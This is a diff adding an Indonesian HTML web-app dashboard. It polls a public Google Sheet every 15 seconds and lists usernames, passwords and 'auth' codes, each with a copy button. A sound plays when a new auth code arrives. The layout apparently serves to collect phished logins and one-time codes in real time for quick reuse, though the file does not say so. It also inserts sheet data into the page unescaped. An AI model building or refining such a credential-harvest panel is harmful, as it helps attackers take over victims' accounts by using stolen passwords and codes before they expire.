@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard PWA</title>
+  <link rel="manifest" href="manifest.json">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .card { @apply p-4 mb-3 border rounded shadow bg-white; }
+    .copy-btn { @apply ml-2 px-2 py-1 bg-blue-500 text-white rounded cursor-pointer; }
+  </style>
+</head>
+<body class="bg-gray-100 p-4">
+  <h1 class="text-2xl font-bold mb-4">Dashboard PWA</h1>
+
+  <div class="mb-4 flex gap-2 flex-wrap">
+    <button id="enableNotif" class="px-3 py-2 bg-green-500 text-white rounded">Aktifkan Notifikasi</button>
+    <button id="disableNotif" class="px-3 py-2 bg-red-500 text-white rounded">Nonaktifkan Notifikasi</button>
+    <span id="notifStatus" class="ml-2 font-semibold">Notifikasi: Nonaktif</span>
+    <button id="filterBtn" class="px-3 py-2 bg-gray-700 text-white rounded ml-auto">Filter Terbaru/Terlama</button>
+  </div>
+
+  <div id="listCard"></div>
+
+  <audio id="notifSound" src="sounds/notif.mp3" preload="auto"></audio>
+
+  <script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('service-worker.js')
+        .then(() => console.log('Service Worker registered'))
+        .catch(err => console.error('Service Worker failed:', err));
+    }
+
+    const apiURL = 'https://opensheet.elk.sh/1UqeWoK2iElSp9scRY0P1j69FJhD_9RuUqCfAS_8brXY/Sheet1';
+    const notifSound = document.getElementById('notifSound');
+    let lastAuthList = [];
+    let notifEnabled = false;
+    let sortLatest = true;
+
+    async function fetchData(playSound = true) {
+      try {
+        const response = await fetch(apiURL);
+        const data = await response.json();
+
+        // Urutkan data berdasarkan tanggal
+        data.sort((a, b) => sortLatest ? new Date(b.date) - new Date(a.date) : new Date(a.date) - new Date(b.date));
+
+        // Cek apakah ada auth baru
+        const currentAuthList = data.map(item => item.auth);
+        const isNewData = currentAuthList.some(auth => !lastAuthList.includes(auth));
+
+        if (playSound && isNewData && lastAuthList.length > 0 && notifEnabled) {
+          notifSound.play();
+        }
+
+        lastAuthList = currentAuthList;
+        displayData(data);
+      } catch (error) {
+        console.error('Gagal mengambil data:', error);
+      }
+    }
+
+    function displayData(data) {
+      const listCard = document.getElementById('listCard');
+      listCard.innerHTML = '';
+
+      data.forEach(item => {
+        const card = document.createElement('div');
+        card.className = 'card';
+        card.innerHTML = `
+          <p><strong>Date:</strong> ${item.date}</p>
+          <p><strong>User:</strong> ${item.usr} <button class="copy-btn" data-copy="${item.usr}">Copy</button></p>
+          <p><strong>Password:</strong> ${item.pss} <button class="copy-btn" data-copy="${item.pss}">Copy</button></p>
+          <p><strong>Auth:</strong> ${item.auth} <button class="copy-btn" data-copy="${item.auth}">Copy</button></p>
+        `;
+        listCard.appendChild(card);
+      });
+
+      document.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          navigator.clipboard.writeText(btn.dataset.copy);
+          alert('Copied: ' + btn.dataset.copy);
+        });
+      });
+    }
+
+    document.getElementById('filterBtn').addEventListener('click', () => {
+      sortLatest = !sortLatest;
+      fetchData(false);
+    });
+
+    document.getElementById('enableNotif').addEventListener('click', () => {
+      notifEnabled = true;
+      document.getElementById('notifStatus').textContent = 'Notifikasi: Aktif';
+    });
+
+    document.getElementById('disableNotif').addEventListener('click', () => {
+      notifEnabled = false;
+      document.getElementById('notifStatus').textContent = 'Notifikasi: Nonaktif';
+    });
+
+    fetchData(false);
+    setInterval(() => fetchData(true), 15000);
+  </script>
+</body>
+</html>
